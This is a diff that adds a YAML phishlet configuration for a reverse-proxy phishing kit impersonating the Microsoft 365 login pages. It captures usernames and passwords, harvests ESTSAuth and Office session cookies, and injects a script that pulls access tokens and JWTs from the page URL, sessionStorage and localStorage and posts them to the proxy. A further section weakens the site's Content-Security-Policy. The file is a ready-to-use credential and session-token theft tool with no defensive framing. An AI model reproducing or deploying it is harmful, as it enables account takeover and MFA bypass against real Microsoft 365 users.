@@ -1,0 +1,116 @@
+name: 'MS365FIXV3'
+min_ver: '2.3.0'
+
+login:
+  username_key: 'loginfmt'
+  password_key: 'passwd'
+  post: '/common/login'
+  success: '/kmsi'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: true}
+  - {phish_sub: 'aadcdn-images', orig_sub: 'aadcdn', domain: 'msauthimages.net', session: true}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login.microsoftonline.com', replace: 'https://login.microsoftonline.com'}
+
+auth_urls:
+  - '/common/oauth2/v2.0/authorize'
+  - '/kmsi'
+  - '/login.srf'
+  - '/common/oauth2/v2.0/token'
+
+credentials:
+  username:
+    key: 'loginfmt'
+    search: 'loginfmt=([^&]+)'
+  password:
+    key: 'passwd'
+    search: 'passwd=([^&]+)'
+
+auth_tokens:
+  - domain: '.microsoftonline.com'
+    keys: ['ESTSAuth', 'ESTSAUTHPERSISTENT', 'ESTSAuth1']
+  - domain: '.office.com'
+    keys: ['OfficeAuth', 'OfficeAuthToken']
+
+custom:
+  - key: 'access_token'
+    search: '"access_token"\s*:\s*"([^"]+)"'
+    type: 'regex'
+
+inject:
+  - url_pattern: 'login.microsoftonline.com'
+    script: |
+      <script>
+      (function(){
+        try {
+          // 1) Check URL fragment for implicit-flow tokens
+          var hash = window.location.hash || '';
+          var m = hash.match(/(?:access_token|id_token)=([^&]+)/i);
+          if (m && m[1]) {
+            fetch('/session', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({access_token: decodeURIComponent(m[1])})
+            }).catch(function(e){console.log('session post failed', e)});
+            return;
+          }
+
+          // 2) Known msal keys pattern in sessionStorage/localStorage
+          var candidates = [];
+          try {
+            for (var i=0;i<sessionStorage.length;i++){
+              var k = sessionStorage.key(i);
+              if (k && /access_token|msal.idtoken|msal.access.token/i.test(k)) {
+                candidates.push(sessionStorage.getItem(k));
+              }
+            }
+          } catch(e){}
+
+          try {
+            for (var i=0;i<localStorage.length;i++){
+              var k = localStorage.key(i);
+              if (k && /access_token|msal\.idtoken|msal\.access\.token/i.test(k)) {
+                candidates.push(localStorage.getItem(k));
+              }
+            }
+          } catch(e){}
+
+          // 3) Some apps store JSON stringified objects — try to extract token-looking substrings
+          for (var j=0;j<candidates.length;j++){
+            var s = candidates[j];
+            if (!s) continue;
+            var mm = s.match(/"access_token"\s*:\s*"([^"]+)"/i) || s.match(/(?:access_token=|access_token\":\s*\")(?:[^\"&]+)([^\"&]*)/i);
+            if (mm && mm[1]) {
+              fetch('/session', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({access_token: decodeURIComponent(mm[1])})
+              }).catch(function(e){console.log('session post failed', e)});
+              return;
+            }
+            // fallback: if candidate *looks like* a JWT (3 parts)
+            if (typeof s === 'string' && s.split('.').length === 3) {
+              fetch('/session', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({access_token: s})
+              }).catch(function(e){console.log('session post failed', e)});
+              return;
+            }
+          }
+
+        } catch (e) {
+          console.log("Token extraction error:", e);
+        }
+      })();
+      </script>
+
+csp_bypass:
+  - domain: 'login.microsoftonline.com'
+    headers:
+      - name: 'Content-Security-Policy'
+        value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
